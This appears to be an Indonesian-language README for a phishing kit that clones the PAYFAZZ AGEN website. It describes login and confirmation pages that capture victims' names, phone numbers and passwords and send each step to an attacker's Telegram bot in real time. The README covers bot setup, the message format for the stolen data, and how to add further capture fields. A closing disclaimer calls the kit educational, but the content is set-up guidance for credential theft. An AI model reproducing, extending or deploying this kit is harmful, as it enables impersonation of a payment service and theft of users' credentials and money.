# PAYFAZZ AGEN Clone Website

Website clone lengkap dari PAYFAZZ AGEN dengan fitur bot Telegram terintegrasi untuk menangkap data real-time.

## 📁 Struktur Folder

```
payfazz-clone/
├── index.html              # Halaman utama
├── login.html              # Halaman login (nama & no HP)
├── konfirmasi.html         # Halaman konfirmasi password
├── konfirmasivia.html      # Halaman konfirmasi metode verifikasi
├── telegram-config.js      # Konfigurasi bot Telegram
└── README.md               # Dokumentasi ini
```

## 🚀 Cara Menjalankan

### 1. Setup Bot Telegram

1. Buat bot baru di Telegram dengan mengirim pesan `/newbot` ke @BotFather
2. Dapatkan token bot dari BotFather
3. Buat grup/channel Telegram dan tambahkan bot sebagai admin
4. Dapatkan Chat ID grup/channel

### 2. Konfigurasi Bot

Edit file `telegram-config.js` dan ganti:
- `BOT_TOKEN`: Token bot dari BotFather
- `CHAT_ID`: ID grup/channel Telegram

Atau edit langsung di setiap file HTML pada bagian:
```javascript
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = 'YOUR_CHAT_ID_HERE';
```

### 3. Menjalankan Website

#### Opsi 1: Buka langsung di browser
```bash
# Buka file index.html di browser
open index.html
```

#### Opsi 2: Menggunakan server lokal
```bash
# Menggunakan Python
python3 -m http.server 8000

# Atau menggunakan Node.js
npx serve .

# Kemudian buka http://localhost:8000
```

## 📱 Fitur Website

### Halaman 1: Index (index.html)
- Tampilan utama PAYFAZZ AGEN
- 3 tombol aksi: Aktifkan Pesanan, Aktifkan Pembayaran, Laporan Kendala
- Desain responsif dengan Tailwind CSS

### Halaman 2: Login (login.html)
- Form input nama lengkap dan nomor handphone
- Validasi input
- Data dikirim ke Telegram saat submit

### Halaman 3: Konfirmasi Password (konfirmasi.html)
- Form input password dan konfirmasi password
- Menampilkan data user sebelumnya
- Validasi password match
- Data dikirim ke Telegram saat submit

### Halaman 4: Konfirmasi Via (konfirmasivia.html)
- Pilihan metode verifikasi (SMS, Email, WhatsApp)
- Ringkasan lengkap semua data
- Modal sukses setelah proses selesai
- Data lengkap dikirim ke Telegram

## 🤖 Fitur Bot Telegram

Bot akan mengirim notifikasi real-time ke Telegram untuk setiap step:

1. **Step Login**: Nama dan nomor HP
2. **Step Password**: Password yang diinput
3. **Step Final**: Data lengkap dengan metode verifikasi

Format pesan yang dikirim:
```
🔔 Data Login Baru
👤 Nama: [Nama User]
📱 No HP: [Nomor HP]
🎯 Aksi: [Jenis Aksi]
⏰ Waktu: [Timestamp]
📍 Step: [login/password_confirmation/final_confirmation]
```

## 🎨 Teknologi yang Digunakan

- **HTML5**: Struktur website
- **Tailwind CSS**: Framework CSS untuk styling
- **JavaScript**: Logika interaktif dan integrasi Telegram
- **LocalStorage**: Penyimpanan data sementara
- **Telegram Bot API**: Pengiriman data real-time
- **Google Fonts**: Typography (Inter font)

## 🔧 Kustomisasi

### Mengubah Styling
Edit bagian `<style>` di setiap file HTML atau tambahkan class Tailwind CSS baru.

### Menambah Field Input
1. Tambahkan input field di HTML
2. Update JavaScript untuk menangkap data
3. Update format pesan Telegram

### Mengubah Flow Halaman
Edit fungsi redirect di JavaScript:
```javascript
window.location.href = 'halaman-tujuan.html';
```

## 📝 Catatan Penting

1. **Keamanan**: Jangan expose token bot di production. Gunakan environment variables.
2. **CORS**: Jika menggunakan server lokal, pastikan CORS diatur dengan benar.
3. **Rate Limiting**: Telegram API memiliki rate limit, jangan spam request.
4. **Privacy**: Data sensitif seperti password dikirim ke Telegram, pastikan grup/channel aman.

## 🐛 Troubleshooting

### Bot tidak mengirim pesan
- Pastikan token bot benar
- Pastikan bot sudah ditambahkan ke grup/channel
- Pastikan Chat ID benar (gunakan @userinfobot untuk mendapatkan ID)

### Website tidak responsif
- Pastikan koneksi internet stabil
- Cek console browser untuk error JavaScript
- Pastikan semua file CSS/JS ter-load dengan benar

### Data tidak tersimpan
- Cek apakah localStorage diaktifkan di browser
- Pastikan tidak ada error JavaScript di console

## 📞 Support

Jika ada masalah atau pertanyaan, silakan buat issue atau hubungi developer.

---

**Disclaimer**: Website ini dibuat untuk tujuan edukasi dan testing. Pastikan mematuhi terms of service platform yang digunakan.
